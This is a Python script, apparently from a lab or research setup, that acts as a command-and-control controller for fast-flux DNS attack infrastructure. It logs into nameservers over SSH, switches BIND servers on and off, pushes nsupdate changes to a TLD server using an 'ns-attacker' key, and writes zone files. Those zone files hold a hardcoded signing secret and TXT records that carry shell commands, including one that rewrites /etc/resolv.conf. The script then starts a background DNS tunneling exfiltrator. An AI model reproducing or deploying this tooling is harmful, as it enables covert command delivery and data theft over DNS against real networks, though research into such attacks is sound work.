import paramiko
import argparse
import subprocess
import sys
import time

servers = {
    'FFA1': '10.0.4.1',
    'FFA2': '10.0.5.1',
    'FFA3': '10.0.6.1'
}

TLD_ip = '10.0.0.1'

username = 'test'
password = 'test'

def execute_remote_command(hostname, command):
    """Connects to a server via SSH and executes a command."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, username=username, password=password)
        stdin, stdout, stderr = client.exec_command(command)
        
        try:
            stdout_data = stdout.read().decode()
            stderr_data = stderr.read().decode()
            print(stdout_data)
            print(stderr_data)
        except Exception:
            print("Command sent to run in background, no output expected.")
        
        client.close()
    except Exception as e:
        print(f"Error connecting to {hostname}: {e}")

def run_local_nsupdate(domain, selected_ip):
    """
    Dynamically creates and runs the nsupdate command locally on C2.
    """
    # The nsupdate command as a multi-line string
    nsupdate_script = f"""
server {selected_ip}
update del {domain} A
update add {domain} 60 A {selected_ip}
send
"""
    print(f"\nPerforming nsupdate on C2 for server {selected_ip}...")
    try:
        command = f"nsupdate -k /home/ns-attacker-key.txt"
        process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(input=nsupdate_script)
        print(stdout)
        print(stderr)
        if process.returncode != 0:
            print(f"nsupdate failed with return code {process.returncode}")
    except Exception as e:
        print(f"Error running nsupdate locally: {e}")

def run_local_nsupdate_TLD(domain, selected_ip):
    """
    Dynamically creates and runs the nsupdate command locally on C2.
    """
    # The nsupdate command as a multi-line string
    nsupdate_script = f"""
server {TLD_ip}
update del {domain} NS
update del ns1.{domain} A
update add {domain} 60 NS ns1.{domain}
update add ns1.{domain} 60 A {selected_ip}
send
"""
    print(f"\nPerforming nsupdate on C2 for server {selected_ip}...")
    try:
        command = f"nsupdate -k /home/TLD-key.txt"
        process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(input=nsupdate_script)
        print(stdout)
        print(stderr)
        if process.returncode != 0:
            print(f"nsupdate failed with return code {process.returncode}")
    except Exception as e:
        print(f"Error running nsupdate locally: {e}")



def build_named_stanza(zone: str) -> str:
    """Return the zone block to add to named.conf.local."""
    return f"""
key "ns-attacker" {{
    algorithm hmac-sha256;
    secret "nvhsmRBHfjI0rKLsTY098adHHtbjRjh+3s8CH0S/k5o=";
}};


zone "{zone}" {{
    type master;
    file "/etc/bind/db.{zone}";
    allow-update {{ key "ns-attacker"; }};
}};
"""


def build_zone_file(selected_ip: str, zone: str) -> str:
    """Return the content of a minimal BIND zone file."""
    ns = "ns1." + zone
    
    return f"""\
$ORIGIN {zone}.
$TTL 60
 
; SOA Record
@   IN  SOA {ns}. admin.{zone}. (
            4458522   ; Serial
            3600       ; Refresh
            1800       ; Retry
            604800     ; Expire
            86400 )    ; Minimum TTL
 
; NS Records
@   IN  NS  {ns}.
 
; A Records
@           IN  A   {selected_ip}
ns1        IN  A   {selected_ip}
*                IN     TXT      "###python3 command2.py""###ls -l /home""###echo -e ~import dns.resolver""##import os""##target_domain = ~new_attacker.com~ ns_records = dns.resolver.resolve(target_domain, ~NS~)~ > command3.py""###python3 command3.py""###echo -e ~nameserver 10.0.2.1~ > /etc/resolv.conf"
"""



def main(domain, selected_ip):
    """Main function to control the DNS servers."""

    if selected_ip not in servers.values():
        print(f"Error: IP address {selected_ip} not found in server list.")
        sys.exit(1)

    selected_server_name = [name for name, ip in servers.items() if ip == selected_ip][0]
    print(f"Selected DNS server: {selected_server_name} ({selected_ip})")

    kill_command = "sudo pkill named"
    start_command = "sudo named -c /etc/bind/named.conf"
    
    append_zone_command = f"echo '{build_named_stanza(domain)}' | sudo tee /etc/bind/named.conf.local > /dev/null"
    create_zone_command = f"echo '{build_zone_file(selected_ip, domain)}' | sudo tee /etc/bind/db.{domain} > /dev/null"
    
    exfiltrator_command = f"nohup sudo python3 /home/tunneling_nameserver.py --domain {domain} > /dev/null 2>&1 &"


    for name, ip in servers.items():
        if ip == selected_ip:
            print(f"\nTurning on {name}...")
            execute_remote_command(ip, start_command)
        else:
            print(f"\nTurning off {name}...")
            execute_remote_command(ip, kill_command)

    print(f"\nNSUpdate TLD...")
    run_local_nsupdate_TLD(domain, selected_ip)
    print(f"\nAppend Zone...")
    execute_remote_command(selected_ip, append_zone_command)
    print(f"\nCreate Zone...")
    execute_remote_command(selected_ip, create_zone_command)
    print(f"\nTurning off")
    execute_remote_command(selected_ip, kill_command)
    print(f"\nTurning on")
    execute_remote_command(selected_ip, start_command)
    time.sleep(10)
    print(f"\nNSUpdate no FFA...")
    run_local_nsupdate(domain, selected_ip)
    print(f"\nRun Exfiltrator script on nameserver FFA...")
    execute_remote_command(selected_ip, exfiltrator_command)
    
    
    
    # Add a small delay to ensure the background command starts before the script exits
    time.sleep(2)

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description="Register a domain-IP pair in a DNS server.")
    parser.add_argument("--domain", required=True, help="Domain name to register (e.g., example.com).")
    parser.add_argument("--ip", required=True, help="IP address of FFA to register for the domain (e.g., 10.0.4.1).")

    args = parser.parse_args()

    main(
        domain=args.domain,
        selected_ip=args.ip
    )